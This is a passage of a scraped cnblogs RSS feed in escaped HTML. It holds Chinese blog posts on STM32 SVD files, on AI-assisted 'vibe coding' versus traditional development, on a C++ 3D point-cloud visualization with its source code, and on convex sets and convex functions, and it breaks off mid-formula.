ä¹Ÿå¯ä»¥ä¼˜é›…çš„ä½¿ç”¨copilotå·¥å…·æ›´å¿«é€Ÿçš„å¼€å‘stm32å•¦</p>\n<h3 id=\"stm32-svdæ–‡ä»¶\">stm32 svdæ–‡ä»¶</h3>\n<p>stmç³»åˆ—svdä»“åº“ï¼š</p>\n<p><a href=\"https://github.com/modm-io/cmsis-svd-stm32\" rel=\"noopener nofollow\" target=\"_blank\">modm-io/cmsis-svd-stm32: CMSIS SVD files for all STM32 devices</a></p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 19:31</span>&nbsp;\n<a href=\"https://www.cnblogs.com/chenyouyuan\">ChenYY~</a>&nbsp;\né˜…è¯»(<span id=\"post_view_count\">8</span>)&nbsp;\nè¯„è®º(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">æ”¶è—</a>&nbsp;\n<a href=\"\">ä¸¾æŠ¥</a>\n</div>"
    },
    {
      "title": "“老东西，你懦弱了”——关于Vibe Coding与传统开发",
      "link": "https://www.cnblogs.com/SilverGo/p/19626693",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/SilverGo/p/19626693\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 17:51\">\n    <span>“老东西，你懦弱了”——关于Vibe Coding与传统开发</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                <div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"前言\">前言</h1>\n<p>鄙人在昨天刷视频的时候，意外刷到了这样的一个video：<br />\n一幅梗图，列举了2025年和2023年的两套开发工具：<br />\n2025年，我们用TRAE、Claude、Copilot、Windows 11，<br />\n2023年，我们用Clion、IDEA、Vim、Emacs、perf、lldb、gdb、Linux。<br />\n文案是：“老东西，你懦弱了！”</p>\n<h1 id=\"_\"></h1>\n<p>从效率来讲，毫无疑问，2025年的这一套工具不仅开发效率大幅上涨，时间成本降低，从工具本身而言，其技术难度也上涨了。<br />\n但是，从程序员的角度而言，我们丧失了对底层的掌控，<br />\n2025年，动动嘴，什么都解决了。<br />\n2023年，一切都要自己动手。<br />\n2025年的我们，一切效率至上，我们利用AI，少写了很多原来需要自己写的代码，<br />\n可我们难道不应该想想，这真的对吗？</p>\n<p>我们应该问自己，当初为什么喜欢CS？<br />\n不就是因为CS本身的自由、解构与建构吗？<br />\n我们选择AI替我们写代码，是一种将未来交给黑盒的行为。<br />\n一旦出现了隐藏的、AI改不出来的错误，这些长期使用AI的“程序员”将直接傻眼。<br />\n程序员最终是要靠代码建构世界的，而不是PUA Agent的。</p>\n<p>但是完全摒弃AI也是不现实的，那么怎么权衡呢？<br />\n以下是鄙人的愚见：<br />\n1.将AI当作一个高级的手册<br />\n2.核心代码必须自己写<br />\n3.重复性的代码：比如补全某个switch，可以使用AI<br />\n4.架构讨论可以使用AI</p>\n<h1 id=\"结语\">结语</h1>\n<p>这篇文章非常短，而且因为时间原因，写的比较仓促，但是意思到了即可<br />\n在现在的AI时代，我们追求效率至上，但是我们更应该把持本心、坚守初心<br />\n长期完全依赖AI只会减弱自己的能力，否极泰来、物极必反，这是必然的<br />\n了解底层、在没有AI的情况下照样能够写出完美的代码，这才是程序员水平高的表现<br />\n谢谢阅读</p>\n\n\n</div>\n<div class=\"clear\"></div>\n\n            </div>\n            <div class=\"postDesc\">posted @ \n<span id=\"post-date\">2026-02-20 17:51</span>&nbsp;\n<a href=\"https://www.cnblogs.com/SilverGo\">Ghost-Face</a>&nbsp;\n阅读(<span id=\"post_view_count\">2</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "小代码，大视野：评一个典型的“数学可视化 + 计算机图形学入门”的优秀案例(C++精灵库3D案例)",
      "link": "https://www.cnblogs.com/lixingqiu/p/19626608",
      "published": "",
      "description": "<h1 class=\"postTitle\"><a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/lixingqiu/p/19626608\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 16:43\">\n    <span>小代码，大视野：评一个典型的“数学可视化 + 计算机图形学入门”的优秀案例(C++精灵库3D案例)</span>\n    \n\n</a>\n</h1>\n\t<div class=\"blogpost-body blogpost-body-html\" id=\"cnblogs_post_body\">\n<p><span><span>​看视频在这里：https://www.douyin.com/video/7608839461102734592</span></span></p>\n<p><span><span>程序代码在最下面。</span></span></p>\n<p><span id=\"cke_bm_12069S\">&nbsp;</span><span id=\"cke_bm_12069S\">这份代码和视频展示了一个非常典型的“数学可视化 + 计算机图形学入门”的优秀案例。它不仅仅是一段能运行的代码，更是一个将抽象数学公式转化为直观视觉艺术的教学演示。</span></p>\n<p><em id=\"__mceDel\"><span id=\"cke_bm_12069S\"> 以下是对该程序及视频的多维度评论：</span></em></p>\n<h2>1. 技术实现与图形学原理</h2>\n<p>这段代码虽然简短，但完整实现了一个微型3D 渲染管线的核心逻辑，这对于 C++ 初学者来说非常有价值：参数化曲面建模：<br />\n代码核心在于那三行坐标计算公式：</p>\n<div class=\"cke_widget_wrapper cke_widget_block cke_widget_codeSnippet cke_widget_selected\">\n<pre class=\"cke_widget_element\"><code class=\"hljs language-cpp\">p.x =a * <span class=\"hljs-built_in\">cos(v) * <span class=\"hljs-built_in\">sin(u);\np.y =a * <span class=\"hljs-built_in\">cos(u) * <span class=\"hljs-built_in\">cos(v);\np.z = -a * <span class=\"hljs-built_in\">sin(v);</span></span></span></span></span></code></pre>\n<span class=\"cke_reset cke_widget_drag_handler_container\"><img class=\"cke_reset cke_widget_drag_handler lazyload\" height=\"15\" title=\"点击并拖拽以移动\" width=\"15\" /></span></div>\n<p>其中a=u。这是一个参数方程，通过&nbsp;u 和&nbsp;v 两个变量的变化生成三维空间中的点集。视频展示的形态类似于一个螺旋曲面或变形的圆锥面。这种将数学公式直接映射为几何形状的做法，是计算机图形学的基础。</p>\n<ul>\n<li>3D 变换（旋转）：</li>\n</ul>\n<p>rotateY 函数实现了标准的旋转矩阵运算。通过每一帧增加 rotate_angle，实现了物体绕 Y 轴的连续旋转动画。这是理解 3D 空间变换最直观的方式。</p>\n<ul>\n<li>透视投影（Perspective Projection）：</li>\n</ul>\n<p>project 函数中 double factor = scale / (2.0 + p.z); 是点睛之笔。它模拟了人眼“近大远小”的视觉效果。如果没有这一行，物体旋转时看起来会是平面的，加上这一行后，Z 轴的深度感立刻显现出来。</p>\n<ul>\n<li>双缓冲技术：</li>\n</ul>\n<p>screen.tracer(0) 和 screen.update() 的配合使用，意味着程序采用了双缓冲机制。先在后缓冲区绘制完所有点，再一次性显示到屏幕。这有效避免了画面绘制过程中的闪烁，保证了动画的流畅性。</p>\n<h2>2. 视觉效果与美学</h2>\n<p>&nbsp;</p>\n<ul>\n<li>点云风格（Point Cloud）：</li>\n</ul>\n<p>程序没有使用线条（Line）或多边形（Polygon）填充，而是使用了 dot(1) 绘制点。这种点云渲染风格不仅节省了计算量（不需要处理遮挡和光栅化），而且产生了一种复古的、类似示波器或早期矢量显示器的科技感。</p>\n<ul>\n<li>动态着色：</li>\n</ul>\n<p>pen.color(x+y) 这行代码非常巧妙。它没有使用复杂的纹理或光照模型，而是根据屏幕坐标(x,y) 的和来映射颜色。<br />\n优点：计算成本极低，且随着物体旋转，屏幕坐标变化，颜色也会随之流动，产生了一种彩虹般的流光效果，极大地增强了视觉吸引力。<br />\n缺点：颜色是绑定在屏幕空间而非物体表面的，所以颜色会随旋转“滑动”，但这恰恰形成了一种独特的动态美感。</p>\n<ul>\n<li>采样密度：</li>\n\n\n</ul>\n<p>u_steps 和 v_steps 均设为 250，意味着每帧要计算并绘制&nbsp;250×250=62,500&nbsp;个点。在 C++ 中这个计算量完全可以接受，视频中也确实展示了细腻且密集的曲面结构。</p>\n<h2>3. 教育意义与工具推广</h2>\n<p>&nbsp;</p>\n<ul>\n<li>降低 C++ 图形编程门槛：</li>\n\n\n</ul>\n<p>传统的 C++ 图形编程（如 OpenGL/DirectX）配置环境复杂，API 繁琐。视频下方的文字说明提到了 “C++ 精灵库” 和 DevC++。这表明该程序旨在通过封装好的简易库，让中学生或编程初学者能快速看到图形化成果，增强学习信心。</p>\n<ul>\n<li>跨学科融合：</li>\n\n\n</ul>\n<p>这个案例完美融合了数学（三角函数、参数方程）、物理（空间旋转）和计算机科学（循环、结构体、坐标映射）。它是 STEM 教育中非常好的素材。</p>\n<h2>4. 改进建议与思考</h2>\n<p>虽然程序运行效果很好，但如果想进一步优化或深入学习，可以考虑以下方向：</p>\n<ul>\n<li>深度缓冲（Z-Buffering）：</li>\n\n\n</ul>\n<p>目前的绘制顺序是固定的。如果曲面自身发生遮挡（例如旋转 180 度后，背面跑到前面），目前的逻辑可能会把背面的点画在正面的点上面，导致视觉穿帮。引入 Z 缓冲可以解决遮挡关系。</p>\n<ul>\n<li>光照模型：</li>\n\n\n</ul>\n<p>目前的颜色仅依赖坐标。如果引入法向量计算和简单的光照（如 Phong 模型），曲面的立体感会更强，能更清晰地看出凹凸结构。</p>\n<ul>\n<li>交互性：</li>\n\n\n</ul>\n<p>目前只能自动旋转。如果能通过鼠标拖动改变 rotate_angle，或者通过键盘改变参数a 的系数，用户就能实时探索不同参数下的曲面形态，互动性会大大增强。</p>\n<ul>\n<li>性能优化：</li>\n\n\n</ul>\n<p>虽然 6 万点不多，但如果要增加密度，可以考虑只绘制可见面，或者使用 GPU 加速（Shader），不过对于学习 CPU 逻辑来说，当前方案已经足够好。</p>\n<h2>总结</h2>\n<p>这是一个典型的“小代码，大视野”的优秀作品。<br />\n它证明了不需要庞大的游戏引擎，仅凭基础的 C++ 语法和数学知识，就能创造出令人惊叹的视觉艺术。对于视频作者而言，这不仅展示了编程能力，更展示了对数学之美的理解。对于观众而言，这是一个极佳的 C++ 图形化入门启蒙，能激发很多人对“代码如何创造世界”的好奇心。</p>\n<p>评分：☆☆☆☆☆&nbsp; (作为教学演示和数学可视化案例)</p>\n<div class=\"cnblogs_code\">\n<pre>#include <span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">sprites.h</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\">包含C++精灵库</span>\n#include &lt;cmath&gt;      <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 数学库（sin/cos/π等）</span>\n#include &lt;vector&gt;     <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 存储顶点坐标</span>\n<span style=\"color: rgba(0, 0, 0, 1);\">\nScreen screen;\nSprite pen{</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">blank</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(0, 0, 0, 1);\">};  \n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">double</span> PI = M_PI;    <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 定义常量</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">double</span> rotate_angle = <span style=\"color: rgba(128, 0, 128, 1);\">0.0</span>;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 旋转角度增量（控制动画速度）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">struct</span> Point3D {    <span style=\"color: rgba(0, 0, 255, 1);\">double</span> x, y, z;};  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3D点结构体\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 3D点绕Y轴旋转（实现动态旋转效果）</span>\nPoint3D rotateY(Point3D p, <span style=\"color: rgba(0, 0, 255, 1);\">double</span><span style=\"color: rgba(0, 0, 0, 1);\"> angle) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> cos_a =<span style=\"color: rgba(0, 0, 0, 1);\"> cos(angle);\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> sin_a =<span style=\"color: rgba(0, 0, 0, 1);\"> sin(angle);\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span><span style=\"color: rgba(0, 0, 0, 1);\"> {\n        p.x </span>* cos_a - p.z *<span style=\"color: rgba(0, 0, 0, 1);\"> sin_a,\n        p.y,\n        p.x </span>* sin_a + p.z *<span style=\"color: rgba(0, 0, 0, 1);\"> cos_a\n    };\n}\n\n</span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 透视投影：3D转2D（简化版，增强Z轴深度感）</span>\n<span style=\"color: rgba(0, 0, 255, 1);\">void</span> project(Point3D p, <span style=\"color: rgba(0, 0, 255, 1);\">int</span>&amp; screen_x, <span style=\"color: rgba(0, 0, 255, 1);\">int</span>&amp; screen_y, <span style=\"color: rgba(0, 0, 255, 1);\">double</span> scale = <span style=\"color: rgba(128, 0, 128, 1);\">100.0</span><span style=\"color: rgba(0, 0, 0, 1);\">) {\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> factor = scale / (<span style=\"color: rgba(128, 0, 128, 1);\">2.0</span> + p.z);  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 透视因子（Z越大，投影越小）</span>\n    screen_x = static_cast&lt;<span style=\"color: rgba(0, 0, 255, 1);\">int</span>&gt;(p.x *<span style=\"color: rgba(0, 0, 0, 1);\"> factor);\n    screen_y </span>= static_cast&lt;<span style=\"color: rgba(0, 0, 255, 1);\">int</span>&gt;(p.y *<span style=\"color: rgba(0, 0, 0, 1);\"> factor);\n}\n\n</span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> main() {        \n    screen.title(</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">作者：李兴球</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>).bgcolor(<span style=\"color: rgba(128, 0, 0, 1);\">\"</span><span style=\"color: rgba(128, 0, 0, 1);\">black</span><span style=\"color: rgba(128, 0, 0, 1);\">\"</span>).tracer(<span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">);\n    pen.hide().pu();\n    \n     </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 遍历参数u和v，计算并绘制所有点</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> u_steps = <span style=\"color: rgba(128, 0, 128, 1);\">250</span>;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> u方向采样数（越多越精细）</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">const</span> <span style=\"color: rgba(0, 0, 255, 1);\">int</span> v_steps =<span style=\"color: rgba(128, 0, 128, 1);\">250</span>;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> v方向采样数</span>\n    <span style=\"color: rgba(0, 0, 255, 1);\">double</span> u_inc = <span style=\"color: rgba(128, 0, 128, 1);\">2</span> * PI /<span style=\"color: rgba(0, 0, 0, 1);\"> u_steps;\n    </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> v_inc = <span style=\"color: rgba(128, 0, 128, 1);\">2</span> * PI / v_steps;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> v范围-π~π，总跨度2π</span>\n   \n    <span style=\"color: rgba(0, 0, 255, 1);\">while</span><span style=\"color: rgba(0, 0, 0, 1);\"> (screen.exitonclick() ) {        \n        screen.clear();   </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 清空屏幕（每一帧重新绘制）           </span>\n        \n        <span style=\"color: rgba(0, 0, 255, 1);\">for</span> (<span style=\"color: rgba(0, 0, 255, 1);\">int</span> i = <span style=\"color: rgba(128, 0, 128, 1);\">0</span>; i &lt;= u_steps; ++<span style=\"color: rgba(0, 0, 0, 1);\">i) {\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> u = i *<span style=\"color: rgba(0, 0, 0, 1);\"> u_inc;\n            </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> a = u;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> a = u（公式要求）</span>\n            <span style=\"color: rgba(0, 0, 255, 1);\">for</span> (<span style=\"color: rgba(0, 0, 255, 1);\">int</span> j = <span style=\"color: rgba(128, 0, 128, 1);\">0</span>; j &lt;= v_steps; ++<span style=\"color: rgba(0, 0, 0, 1);\">j) {\n                </span><span style=\"color: rgba(0, 0, 255, 1);\">double</span> v = -PI + j * v_inc;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> v从-π到π               </span>\n                Point3D p;   <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 计算原始3D坐标（蜗牛曲面公式）</span>\n                p.x =a * cos(v) *<span style=\"color: rgba(0, 0, 0, 1);\"> sin(u);\n                p.y </span>=a * cos(u) *<span style=\"color: rgba(0, 0, 0, 1);\"> cos(v);\n                p.z </span>= -a *<span style=\"color: rgba(0, 0, 0, 1);\"> sin(v);\n                </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 绕Y轴旋转，从而实现动态3D效果</span>\n                p =<span style=\"color: rgba(0, 0, 0, 1);\"> rotateY(p, rotate_angle);               \n                </span><span style=\"color: rgba(0, 0, 255, 1);\">int</span><span style=\"color: rgba(0, 0, 0, 1);\"> x, y;\n                project(p, x, y);   </span><span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 投影到2D屏幕坐标</span>\n                <span style=\"color: rgba(0, 0, 255, 1);\">if</span>(x&gt;=<span style=\"color: rgba(128, 0, 128, 1);\">400</span> || x&lt;=-<span style=\"color: rgba(128, 0, 128, 1);\">400</span> || y&gt;=<span style=\"color: rgba(128, 0, 128, 1);\">300</span> || y&lt;= -<span style=\"color: rgba(128, 0, 128, 1);\">300</span>)<span style=\"color: rgba(0, 0, 255, 1);\">continue</span><span style=\"color: rgba(0, 0, 0, 1);\">; \n                pen.color(x</span>+y).go(x, y).dot(<span style=\"color: rgba(128, 0, 128, 1);\">1</span>);  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 绘制当前点     </span>\n<span style=\"color: rgba(0, 0, 0, 1);\">            \n            }\n        }\n        screen.update();\n        rotate_angle </span>+= <span style=\"color: rgba(128, 0, 128, 1);\">0.02</span><span style=\"color: rgba(0, 0, 0, 1);\">;\n        </span><span style=\"color: rgba(0, 0, 255, 1);\">if</span> (rotate_angle &gt; <span style=\"color: rgba(128, 0, 128, 1);\">2</span> * PI) rotate_angle -= <span style=\"color: rgba(128, 0, 128, 1);\">2</span> * PI;  <span style=\"color: rgba(0, 128, 0, 1);\">//</span><span style=\"color: rgba(0, 128, 0, 1);\"> 重置角度，避免溢出        </span>\n<span style=\"color: rgba(0, 0, 0, 1);\">    }\n    \n    </span><span style=\"color: rgba(0, 0, 255, 1);\">return</span> <span style=\"color: rgba(128, 0, 128, 1);\">0</span><span style=\"color: rgba(0, 0, 0, 1);\">;    \n}</span></pre>\n</div>\n<p>&nbsp;</p>\n\n<span>\n<span>​</span></span>\n\n</div>\n<div class=\"clear\"></div>\n\n\t<div class=\"postDesc\">posted on \n<span id=\"post-date\">2026-02-20 16:43</span>&nbsp;\n<a href=\"https://www.cnblogs.com/lixingqiu\">李兴球</a>&nbsp;\n阅读(<span id=\"post_view_count\">21</span>)&nbsp;\n评论(<span id=\"post_comment_count\">0</span>)&nbsp;\n&nbsp;\n<a href=\"\">收藏</a>&nbsp;\n<a href=\"\">举报</a>\n</div>"
    },
    {
      "title": "凸优化数学基础笔记（六）：凸集、凸函数与凸规划",
      "link": "https://www.cnblogs.com/GeophysicsWorker/p/19626486",
      "published": "",
      "description": "<h1 class=\"postTitle\">\n                <a class=\"postTitle2 vertical-middle\" href=\"https://www.cnblogs.com/GeophysicsWorker/p/19626486\" id=\"cb_post_title_url\" title=\"发布于 2026-02-20 14:30\">\n    <span>凸优化数学基础笔记（六）：凸集、凸函数与凸规划</span>\n    \n\n</a>\n\n            </h1>\n            <div class=\"clear\"></div>\n            <div class=\"postBody\">\n                    <div id=\"cnblogs_post_description\" style=\"display: none;\">\n        \n        现有最优化方法对一般函数只能找到局部最优解，判断有无极值点以及它是否为全局最优解要用到函数凸性概念。一般在现实优化问题上，我们一般把优化问题变成凸优化问题，因为凸优化，**凸优化（Convex OPtimization）**是数学优化中的一个重要分支，研究的是在凸集上极小值的问题。下面首先介绍凸集。从直观上看，凸集是这样一些点的集合，它的内部没有“洞”（hole），边界不向内凹。凸集的基本特征，是其上任取两点所联成线段上的点依然属于这个集合。在数学上就是采用这种描述方法给凸集下定义的。首先给出凸组合的概念，在给出凸集和凸函数的定义，并简单讨论凸函数判定方法\n    </div>\n<div class=\"blogpost-body cnblogs-markdown\" id=\"cnblogs_post_body\">\n<h1 id=\"凸优化数学基础笔记六凸集凸函数与凸规划\">凸优化数学基础笔记（六）：凸集、凸函数与凸规划</h1>\n<p>现有最优化方法对一般函数只能找到局部最优解，判断有无极值点以及它是否为全局最优解要用到函数凸性概念。一般在现实优化问题上，我们一般把优化问题变成凸优化问题，因为凸优化，凸优化（Convex OPtimization）是数学优化中的一个重要分支，研究的是在凸集上极小值的问题。下面首先介绍凸集。从直观上看，凸集是这样一些点的集合，它的内部没有“洞”（hole），边界不向内凹。凸集的基本特征，是其上任取两点所联成线段上的点依然属于这个集合。在数学上就是采用这种描述方法给凸集下定义的。首先给出凸组合的概念，在给出凸集和凸函数的定义，并简单讨论凸函数判定方法。</p>\n<h2 id=\"1凸-集convex-set\">1.凸 集（Convex Set）</h2>\n<p>​\t<strong>Definition 6.1（凸组合定义）</strong> 设<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2,\\cdots,\\mathbf{X}_l\\)</span> 是<span class=\"math inline\">\\(\\mathbf{R}^n\\)</span> 中的<span class=\"math inline\">\\(l\\)</span>个已知点。若对于某个点<span class=\"math inline\">\\(\\mathbf{X}\\in\\mathbf{R}^n\\)</span> 存在常数<span class=\"math inline\">\\(\\alpha_1,\\alpha_2,\\cdots,\\alpha_{l}\\geq0\\)</span>，且<span class=\"math inline\">\\(\\sum_{i=1}^{l}\\alpha_i=1\\)</span> 使得<span class=\"math inline\">\\(\\mathbf{X}=\\sum_{i=1}^l\\alpha_i\\mathbf{X}_i\\)</span>，则称<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 是<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2,\\cdots,\\mathbf{X}_l\\)</span> 的<strong>凸组合</strong>。若 <span class=\"math inline\">\\(\\alpha_1,\\alpha_2,\\cdots,\\alpha_l&gt;0\\)</span> 且<span class=\"math inline\">\\(\\sum_{i=1}^l\\alpha_i=1\\)</span>，则称<span class=\"math inline\">\\(\\mathbf{X}\\)</span>是<span class=\"math inline\">\\(\\mathbf{X_1},\\mathbf{X}_2,\\cdots,\\mathbf{X}_l\\)</span> 的<strong>严格凸组合</strong>。</p>\n<p>​\t考虑两点<span class=\"math inline\">\\(\\mathbf{X}_1\\)</span>和<span class=\"math inline\">\\(\\mathbf{X}_2\\)</span>的凸组合<span class=\"math inline\">\\(\\mathbf{X}=\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2\\)</span> ，其中<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\geq{0}\\)</span> 且<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span>。把 <span class=\"math inline\">\\(\\alpha_2=1-\\alpha_1\\)</span> 代入<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 的凸组合中得到<span class=\"math inline\">\\(\\mathbf{X}=\\mathbf{X}_2+\\alpha_1(\\mathbf{X}_1-\\mathbf{X}_2)\\)</span> ，其中<span class=\"math inline\">\\(\\alpha\\in[0,1]\\)</span>。由解析几何知识可知，当 <span class=\"math inline\">\\(\\alpha_1\\)</span>从0变到1时，点<span class=\"math inline\">\\(\\mathbf{X}\\)</span> 由点<span class=\"math inline\">\\(\\mathbf{X}_2\\)</span> 出发沿<span class=\"math inline\">\\(\\mathbf{X}_1-\\mathbf{X}_2\\)</span> 的方向移动到<span class=\"math inline\">\\(\\mathbf{X}_1\\)</span> 。由此可知，<span class=\"math inline\">\\(\\mathbf{X}_1\\)</span>和<span class=\"math inline\">\\(\\mathbf{X}_2\\)</span> 所有严格凸组合的集合是不含<span class=\"math inline\">\\(\\mathbf{X}_1\\)</span>和<span class=\"math inline\">\\(\\mathbf{X}_2\\)</span> 两端点的线段。</p>\n<p>​\t<strong>Definition 6.2 （凸集的定义）</strong> 设集合<span class=\"math inline\">\\(\\mathbf{C}\\subseteq{\\mathbf{R}^n}\\)</span>。如果对于任意两点<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in{\\mathbf{C}}\\)</span> ，它们的任意两点<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in{\\mathbf{C}}\\)</span> ，它们的任意凸组合仍然属于<span class=\"math inline\">\\(\\mathbf{C}\\)</span> ，则称集合<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 为<strong>凸集</strong>。特别地规定，空集是凸集。</p>\n<p>​\t<strong>Definition 6.3 (半空间的定义)</strong>  设<span class=\"math inline\">\\(\\mathbf{a}\\in\\mathbf{R}^n\\)</span> 且 <span class=\"math inline\">\\(\\mathbf{a}\\neq \\mathbf{0},b\\in{\\mathbf{R}^1}\\)</span> ，则集合<span class=\"math inline\">\\(\\{\\mathbf{X}|\\mathbf{a}^T\\mathbf{X}\\geq{b},\\mathbf{X}\\in{R^n}\\}\\)</span> 称为<span class=\"math inline\">\\(\\mathbf{R}^n\\)</span> 中的一个半空间。</p>\n<p>​\t容易地验证，空间<span class=\"math inline\">\\(\\mathbf{R}^n\\)</span>、半空间、超平面、直线、点、球都是凸集。</p>\n<p>​\t<strong>定理 6.1</strong> 任意一组凸集的交集仍然是<strong>凸集</strong>。</p>\n<p>​\t<strong>证 明：</strong> 设<span class=\"math inline\">\\(C=\\cap_{i\\in I}C_i\\)</span> ,其中<span class=\"math inline\">\\(I\\)</span>是<span class=\"math inline\">\\(\\{C_i\\}\\)</span> 的下标集，<span class=\"math inline\">\\(C_i\\)</span> 都是凸集。任取<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in{C}\\)</span> , 则对于任意<span class=\"math inline\">\\(i\\in{I}\\)</span> 都有<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in \\mathbf{C}_i\\)</span>。任取<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in{[0,1]}\\)</span> 且<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span>，因为<span class=\"math inline\">\\(C_i\\)</span> 是凸集，有 <span class=\"math inline\">\\(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2\\in{C_i}\\)</span>。于是，<span class=\"math inline\">\\(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2\\in \\cap_{i\\in{I}}C_i=C\\)</span>，即<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 是凸集。</p>\n<h2 id=\"2凸函数convex-function\">2.凸函数（Convex Function）</h2>\n<p>​\t<strong>Definition 6.4 （凸函数的定义）</strong> 设<span class=\"math inline\">\\(f:\\mathbf{C}\\subseteq\\mathbf{R}^n\\rightarrow\\mathbf{R}^1\\)</span> , 其中<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 为凸集。若对于任意两点<span class=\"math inline\">\\(\\mathbf{X}_1,\\mathbf{X}_2\\in{C}\\)</span> 和任意一对满足<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span> 的数<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in[0,1]\\)</span> ，都有 <span class=\"math inline\">\\(f(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2)\\leq \\alpha_1f(\\mathbf{X}_1)+\\alpha_2f(\\mathbf{X}_2)\\)</span> ，则称<span class=\"math inline\">\\(f\\)</span> 为定义在<span class=\"math inline\">\\(\\mathbf{C}\\)</span> 上的<strong>凸函数</strong>。若对于任意一对满足<span class=\"math inline\">\\(\\alpha_1+\\alpha_2=1\\)</span>的数<span class=\"math inline\">\\(\\alpha_1,\\alpha_2\\in(0,1)\\)</span> 都有：</p>\n<p></p><div class=\"math display\">\\[f(\\alpha_1\\mathbf{X}_1+\\alpha_2\\mathbf{X}_2)&lt;\\alpha_1f(\\mathbf{X}_1)+\\alpha_2f(\\mathbf{X}_2) 